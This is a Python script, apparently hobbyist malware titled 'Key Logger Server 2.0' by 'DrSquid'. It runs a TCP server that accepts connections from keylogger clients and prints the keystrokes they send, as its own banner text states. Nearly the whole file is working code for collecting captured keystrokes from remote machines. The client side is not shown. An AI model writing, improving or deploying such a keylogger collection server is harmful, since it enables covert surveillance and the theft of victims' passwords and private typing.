import socket, threading

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '192.168.0.115'
port = 1234
s.bind((ip, port))
connlist = []
print("  _  __            _                                    _____                            ___    ___  ")
print(" | |/ /           | |                                  / ____|                          |__ \  / _ \ ")
print(" | ' / ___ _   _  | |     ___   __ _  __ _  ___ _ __  | (___   ___ _ ____   _____ _ __     ) || | | |")
print(" |  < / _ \ | | | | |    / _ \ / _` |/ _` |/ _ \ '__|  \___ \ / _ \ '__\ \ / / _ \ '__|   / / | | | |")
print(" | . \  __/ |_| | | |___| (_) | (_| | (_| |  __/ |     ____) |  __/ |   \ V /  __/ |     / /_ | |_| |")
print(" |_|\_\___|\__, | |______\___/ \__, |\__, |\___|_|    |_____/ \___|_|    \_/ \___|_|    |____(_)___/ ")
print("            __/ |               __/ | __/ |                                                          ")
print("           |___/               |___/ |___/                                                           ")
print("Script By DrSquid")
print("A script for making the client side send what keys they press onto this server.")
def connect():
    print("[+] Server is up and running.........")
    while True:
        try:
            s.listen(1)
            conn, connip = s.accept()
            print(f"[+] {connip} has joined the server.")
            connlist.append(conn)
        except:
            pass
def recv():
    while True:
        for conns in connlist:
            try:
                conn = conns
                msg = conn.recv(1024).decode()
                print(f"[+] {conn}: {msg}")
            except:
                pass
connecter = threading.Thread(target=connect)
connecter.start()
reciever = threading.Thread(target=recv)
reciever.start()
